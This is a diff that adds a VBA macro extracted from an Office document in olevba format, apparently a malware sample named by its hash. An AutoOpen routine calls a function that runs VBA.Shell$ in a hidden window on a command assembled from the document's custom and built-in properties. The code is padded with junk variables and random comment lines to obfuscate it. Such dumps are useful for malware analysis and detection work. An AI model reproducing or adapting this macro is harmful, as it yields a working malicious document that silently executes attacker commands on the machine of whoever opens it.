@@ -1,0 +1,81 @@
+Filename     : ./macros/d621d5dea6a95c31650a4c46aaf507625a8e18f33b5a4a22e8a801c25dc77a49
+OLE stream   : Macros/VBA/Module1
+VBA filename : Module1.bas
+----------------------------------------
+Attribute VB_Name = "Module1"
+'PHMKstTspDsyFTWKvsnZpCDhymcMNDTgXpgNedszAcnagxpxcWyteyzkDveF
+ 'anNUstVXeHDUVZndWsgSfSWLrmfmLGKwLYnnRLHbaFhFLSaatBYfgGDyZggRTTUFDVSK
+ 'AmugWhBnFENKawngmRehhXYaXtvPypRCCDHAzpabLBftfWNGsPYTrHxkBCAKHSHeuZ
+ 'KVrWuuxEzwKxMKPLCaweRexMxEFdDXWuAPGPdeMMEbWwSZrkmBUrwPgwSHBeHkfeH
+ 'MDrAVBMawfSRVPMczUhedUaLVUBUsTBasXUnbPWMkHebfSFxvssMZKBUwkfxWbKaS
+ 'cGyGwDYvTtYGHDhvaePLmxSPzAsvuhdyvUBzSKepHBmpkSmPdwuUcneSVvaF
+ 'bbacLxAeGvybFrfALEErsffYbCGgAYAhEdwxZnAyMerGBLwCgxYkAcNfGbCFPrFu
+ 'ZgHZwwvVHpXLGKLckySfATAFfSxntWapRPnBZkndPbBusMdPEThWzuAeH
+ 'gcaWZRWcazUemsvmzwerFTtaFFFUVKzBWMCGMCNSmhsYPNFaFxmewCsMvFSCdrZ
+ 'GgCFDhRSweWHrChmSHeaBuEPKaznAXMueZZaBmLMzruYYsRXfhNHeWaZwmrgtN
+ 'eBtmusKBwtMnBwmBtEsCmvHgEgwbZkAXmuBbrYVSMWvrXMsVcnAhbeMVYH
+ 'GFZxLxYsDCELWZULtSVDsTYUCVkAdUWTLXLTwbstfCwLzBWMrXgHNcdU
+ 'EYZweFyghbUEBSuBcyFEKapWDTTYKXYuhtfnKGTPhtRSSSfmLyUefuLnYthTfvE
+ 'dkVwfEHpuTetegfGALcmtExDGaaZfRDkDGsrLcrMAnmbVCbSgentRBgLSDXzC
+
+Function eymEyBgaPgx()
+aHaydwcPsts = ("sMFpMdP")
+ HPVZvBWfsb = ("CWbpTetTRHN")
+ EmgHYCTEHT = ("xZbUnhcVCL")
+ rzEPfzVhB = ("cNggvkZ")
+LzYAyWhc = ("fCPfgEGDcT")
+atttvuU = ("YEdhCLpLwn")
+ wFGHdFu = ("mnWxeMU")
+WuSNfTKVSL = ("NApNhhK")
+ USUFRSw = ("tdLtHTLF")
+ GZXRbMnBFDW = ("YUdLNPdUTE")
+VBA.Shell$ "" + hVmgnLh + pVKbAvrpy + swTrnwWusMe + EUGsMTxX + gRAKsxPVnf + erxzSKFkA + NWxBFZY + TSUGKhg + RtFcHGWsdfA + TDcCcaLs + ActiveDocument.CustomDocumentProperties("XkHMfWEK") + ActiveDocument.CustomDocumentProperties("TwYcAVpNE") + hVmgnLh + pVKbAvrpy + swTrnwWusMe + EUGsMTxX + gRAKsxPVnf + erxzSKFkA + NWxBFZY + TSUGKhg + RtFcHGWsdfA + TDcCcaLs + ActiveDocument.BuiltInDocumentProperties("Comments") + hVmgnLh + pVKbAvrpy + swTrnwWusMe + EUGsMTxX + gRAKsxPVnf + erxzSKFkA + NWxBFZY + TSUGKhg + RtFcHGWsdfA + TDcCcaLs + ygsAbUKKc, 0
+wLAuZRe = ("wmkSrAZCXW")
+ LDmECaUgCV = ("UHLztfWmf")
+fYCVszf = ("DEzgzVdkaFW")
+ PFUgpErxpMV = ("VdnuFYres")
+ TwUgfErX = ("PgXhcufcxW")
+ rzyubVzdfEb = ("dcZxTCadEtK")
+aEGLZsZ = ("hSaWbDCurMu")
+KKEhbvBdEmR = ("drHWgznKtg")
+ YxxvVXhAg = ("UfRKWvSDt")
+ EyeeWSpm = ("LXyDamaLC")
+
+End Function
+'gzwWEkZTvMtACSzcDNHRPpFyvsChhwKtugPAnUxBxSrVgThUzFvKwcYYFNzeXeV
+ 'GAgYnvkyddwmbMWMHMDUahdgYUKuFYZhathDkAUYuswbHrPtcnpLeaxYnWpZwYpCtYW
+ 'DeDrSvGWbaasVgugMNdXEARRKsUtKETtcmkHnNkNTKeDHYcdwdLWrMhPhstvru
+ 'SxHyWttHxKRfGHYkHHybdMxcDeBKATcvaKygBBSaBaZLGRWMkvevmNXCcBKrLaaXSnr
+ 'fGPSzMwznazkLxmMvFMuaXTmnhmmrsduxvCaUSWwTdLbEhrRhTRrcarYZVt
+ 'fPsbxThNUzGCHCDhMaYwGCcpDvEvrHYtsckpwzTXwndzsTxtBSBNCkyTYwHbVgL
+ 'xkLYusFYdnSkguNYWXbtGAUZRWtcbpMCRDEaTxzmuTYyNvkEhuPWVwanRhSYc
+ 'CcTzLfxumWCrdMwurGFGMnUKtvzfgFshMHGBvxhpbTgGZYBEhUthHHkWKgYfFafNf
+ 'hHACtTKfTbTuGBumtRUVWRfvALyvvDkaSXtrNUtyeccdUSHyLtHCAgGcRSvtv
+ 'eRnkZKgEYctrwyMvsphnZNDSANexbxYSSEZGFBKXrRTtzaSBeYgBDyustnhvkMSnr
+ 'edyWvrNXckzLbePVhEcywRyBugbUHaCXkmCSATkSXBaDXzHwbCYwrmeTZbvemMgBzzLSXA
+ 'RDfCekZtpUUdPUaNrHXtwhWnkrWWMgCPBBhTceRumhmuBkPzLEaUmEzwAzTNAEPeZzDS
+ 'TvYwVhXGRxukxvkvzZuFXCWkbZwurgwGvLCsRSTeDApsGShwsAEppvBshLtDcnyTUw
+ 'VcAbBgPmNYDgkZxSkKrWuKMVMDgrbdaCDbbzaAkkpTvkePCnmerRExZfttuPDxV
+ 'vxfKDdUFMVZbCFVfrbDSXewfaFkZeEkSGWAdyBDYdeKRvVTGkePPPMXvfGbMMgWa
+ 'FyMwGxeLvekDcxUEWTUGphfyVcZVpPhYuVfwVAdCeNRvhaxhKLwPagZrEmnbve
+ 'XLUKNwwmEbkGfMpXvHvtgvBcPPheZeFNLULHgExHwzUChzKrwTZnrcmWKptbfUzP
+ 'fHmdWkwdezUWhkxLRbymHBGKmXBKKyMEUphhZdTUMkAkauyLwbfdHETDgRssTPV
+ 'TfRsbHmdWCbrdTZTwpeRpGznfWBECuZHCmXTFUZgsmCpZvGwVwUSzZShmU
+ 'GMFNHhYKewWAYxzSyaHWxVGMkfdkDtzybhASkDRzpKtZMCPRbuFuKektu
+ 'gMWCgfZFMhgPstcYKEdYLPwwPawBurxpWgdTwmdDFHYxhEkrfkdFvPdvTxDWA
+ 'LvMAWxaPhVUABDFrZHaSBnVztnfRKvGEgDmAMcGaPgXeGXMWSwKbXzmmvRWCVMgdRHNYt
+ 'YCXmuUuTakvUCDSFrrfEmmHhyzgDMehskPtVbCFFMhchYAeLxwdtepscBGPAcdRnhL
+
+Sub autoopen()
+bmbYfpBmGLg = ("szxGEkan")
+ YGbeAhbARK = ("TzUgtFA")
+ XyRMUmcT = ("gFHHZrF")
+dLenDGfVk = ("vEhpsUKf")
+ mUmLzpVU = ("kWzkWZXmT")
+ bSaAcLn = ("seZApyRSs")
+eymEyBgaPgx
+fAVuBTpeL = ("HyWcbtFkdE")
+ wPKXYua = ("kgMPhgAbW")
+mCXavzy = ("wWBfzpfdmv")
+
+End Sub
